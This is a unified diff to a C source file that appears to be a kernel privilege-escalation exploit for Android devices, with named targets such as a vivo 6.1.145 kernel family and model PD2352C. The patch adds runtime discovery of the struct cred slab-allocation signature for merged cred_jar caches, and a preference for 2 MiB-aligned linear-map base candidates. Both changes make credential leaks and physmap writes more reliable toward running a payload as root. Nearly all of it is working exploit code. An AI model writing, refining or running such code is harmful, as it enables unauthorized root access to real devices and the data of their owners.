@@ -227,6 +227,7 @@ static unsigned long long g_rel_abs;
 static int g_held;
 static int g_fake_stage;
 static int g_exec_payload; /* ksu mode: run PAYLOAD_CMD as the fake-cred root */
+static int g_cred_sig_adopted; /* discovery replaced the table's cred_req */
 static int g_full_shell;
 static int g_root_ok;
 static int g_diag;
@@ -529,22 +530,23 @@ static int scan_cred_allocs(const unsigned char *b, size_t n, int pid,
     return found;
 }
 
-/* Debug aid for a missed cred leak: the distinct (bytes_req, bytes_alloc)
- * pairs of the child's own kmem_cache_alloc records, restricted to sizes a
- * struct cred could plausibly have.  Tells a wrong cred_req in the staged
- * table (a pair is listed, but not the expected one) apart from the exec
- * not being inside the trace window at all (no pair listed).  One logf call
- * so the line cannot interleave with the child's output. */
-static void log_child_alloc_sizes(const unsigned char *b, size_t n, int pid,
-                                  unsigned long long want)
+/* The child's own kmem_cache_alloc records, aggregated into distinct
+ * (bytes_req, bytes_alloc) pairs with cred-plausible sizes.  Shared by the
+ * failure diagnostic below and the cred-signature discovery. */
+struct child_alloc_pair
 {
-    unsigned long long req[12], alloc[12], cnt[12];
-    char line[512];
-    int hc = 0, k, len;
+    unsigned long long req, alloc, cnt;
+};
+
+static int collect_child_alloc_pairs(const unsigned char *b, size_t n, int pid,
+                                     struct child_alloc_pair *out, int max)
+{
+    int hc = 0;
 
     for (size_t i = 16; i + 24 <= n; i += 4)
     {
         unsigned long long r, a;
+        int k;
 
         if (u32(b, i - 12) != (unsigned)pid || !is_kernel_ptr(u64(b, i)))
             continue;
@@ -553,28 +555,80 @@ static void log_child_alloc_sizes(const unsigned char *b, size_t n, int pid,
         if (r < 0x60 || r > 0x200 || a < r)
             continue;
         for (k = 0; k < hc; k++)
-            if (req[k] == r && alloc[k] == a)
+            if (out[k].req == r && out[k].alloc == a)
             {
-                cnt[k]++;
+                out[k].cnt++;
                 break;
             }
-        if (k == hc && hc < 12)
+        if (k == hc && hc < max)
         {
-            req[hc] = r;
-            alloc[hc] = a;
-            cnt[hc] = 1;
+            out[hc].req = r;
+            out[hc].alloc = a;
+            out[hc].cnt = 1;
             hc++;
         }
     }
+    return hc;
+}
+
+/* Debug aid for a missed cred leak: prints the pairs above in one logf call,
+ * so the line cannot interleave with the child's output.  Tells a wrong
+ * cred_req in the staged table (a pair is listed, but not the expected one)
+ * apart from the exec not being inside the trace window at all. */
+static void log_child_alloc_sizes(const unsigned char *b, size_t n, int pid,
+                                  unsigned long long want)
+{
+    struct child_alloc_pair pairs[16];
+    char line[512];
+    int hc, k, len;
+
+    hc = collect_child_alloc_pairs(b, n, pid, pairs, 16);
     len = snprintf(line, sizeof(line),
                    "[cred] child=%d kmem_cache_alloc sizes near cred (want "
                    "req=%#llx):", pid, want);
     for (k = 0; k < hc && len > 0 && (size_t)len < sizeof(line); k++)
         len += snprintf(line + len, sizeof(line) - (size_t)len,
-                        " %#llx/%#llx x%llu", req[k], alloc[k], cnt[k]);
+                        " %#llx/%#llx x%llu", pairs[k].req, pairs[k].alloc,
+                        pairs[k].cnt);
     if (!hc)
         snprintf(line + len, sizeof(line) - (size_t)len, " none");
     logf("%s\n", line);
+}
+
+/* Runtime cred-signature discovery.  A fork+exec of a fresh process performs
+ * exactly two cred_jar allocations (copy_creds' prepare_creds plus
+ * prepare_exec_creds), and cred_jar may be a MERGED cache whose object_size
+ * differs from sizeof(struct cred): the vivo 6.1.145 family has
+ * sizeof(cred)=0xb0 while the merged cache reports bytes_req=0xb8, so a
+ * BTF-derived table cred_req misses every record.  This picks the unique
+ * cred-sized pair that occurred exactly twice; the count==2 shape is the
+ * fork+exec cred signature and no other cache in that window matches it
+ * (observed on PD2352C: 0xc8 x40, 0x100 x45, 0x108 x8, 0xd0 x3 ...).
+ * Ambiguity or absence returns 0 and the run keeps the table's value. */
+static int discover_cred_signature(const unsigned char *b, size_t n, int pid,
+                                   unsigned long long *req_out,
+                                   unsigned long long *alloc_out)
+{
+    struct child_alloc_pair pairs[16];
+    int hc, found = -1, hits = 0;
+
+    hc = collect_child_alloc_pairs(b, n, pid, pairs, 16);
+    for (int k = 0; k < hc; k++)
+    {
+        if (pairs[k].cnt != 2)
+            continue;
+        if (pairs[k].req < 0x88 || pairs[k].req > 0x120)
+            continue;
+        if (pairs[k].alloc < pairs[k].req || pairs[k].alloc > pairs[k].req + 0x48)
+            continue;
+        found = k;
+        hits++;
+    }
+    if (hits != 1)
+        return 0;
+    *req_out = pairs[found].req;
+    *alloc_out = pairs[found].alloc;
+    return 1;
 }
 
 static int scan_task_allocs(const unsigned char *b, size_t n, int pid,
@@ -981,14 +1035,36 @@ static unsigned long long calibrate_base(unsigned char *raw)
         }
     }
     {
-        unsigned long long best = 0, bestc = 0;
+        unsigned long long best = 0, bestc = 0, abest = 0, abestc = 0;
 
         for (int k = 0; k < hc; k++)
+        {
             if (hcnt[k] > bestc)
             {
                 bestc = hcnt[k];
                 best = hist[k];
             }
+            /* The linear-map base on this device family is 2 MiB aligned
+             * (memory bank start); an unaligned candidate is a mispaired
+             * (slab, pfn) vote, not a real base.  Observed: two runs on
+             * one boot voted 0xffffff7f80000000 (aligned, x484) and
+             * 0xffffff7ddcce4000 (unaligned, x62) -- the second would have
+             * aimed every later physmap write at garbage.  Prefer an
+             * aligned candidate whenever one clears the same vote floor,
+             * and say so in the log. */
+            if (!(hist[k] & 0x1fffffULL) && hcnt[k] > abestc)
+            {
+                abestc = hcnt[k];
+                abest = hist[k];
+            }
+        }
+        if (abestc >= 4 && abest != best)
+        {
+            logf("[base] dropping unaligned best=%#llx (%llu votes) for "
+                 "aligned %#llx (%llu votes)\n", best, bestc, abest, abestc);
+            best = abest;
+            bestc = abestc;
+        }
         logf("[base] made=%d c=%d rn=%d best=%#llx count=%llu\n", made,
              c, rn, best, bestc);
         return bestc >= 4 ? best : 0;
@@ -2378,6 +2454,30 @@ static unsigned long long leak_cred(unsigned char *raw,
         {
             c = scan_cred_allocs(raw, (size_t)n, (int)p, &site, &R);
             tc = scan_task_allocs(raw, (size_t)n, getpid(), &task);
+        }
+        /* The table's cred signature found nothing while the exec clearly
+         * ran (hello arrived): cred_jar merged with another cache and the
+         * trace reports the merged object_size, not sizeof(struct cred)
+         * that BTF gave the extractor.  Adopt the unique count==2 cred
+         * pair from this very window and rescan before giving up -- same
+         * self-healing the timer call site already gets. */
+        if (!R && !c && n > 0 && hello == CHILD_HELLO && !g_cred_sig_adopted)
+        {
+            unsigned long long want = G_CRED_REQ, dreq, dalloc;
+
+            if (discover_cred_signature(raw, (size_t)n, (int)p, &dreq,
+                                        &dalloc))
+            {
+                logf("[cred] table cred_req=%#llx matched 0 records; "
+                     "adopting runtime signature req=%#llx alloc=%#llx "
+                     "x2 (merged cred_jar)\n", want, dreq, dalloc);
+                g_geo.cred_req = dreq;
+                g_geo.cred_alloc = dalloc;
+                g_cred_sig_adopted = 1;
+                c = scan_cred_allocs(raw, (size_t)n, (int)p, &site, &R);
+                logf("[cred] rescan with the adopted signature: recs=%d "
+                     "R=%#llx\n", c, R);
+            }
         }
         if (R && (!g_fake_stage || task))
         {
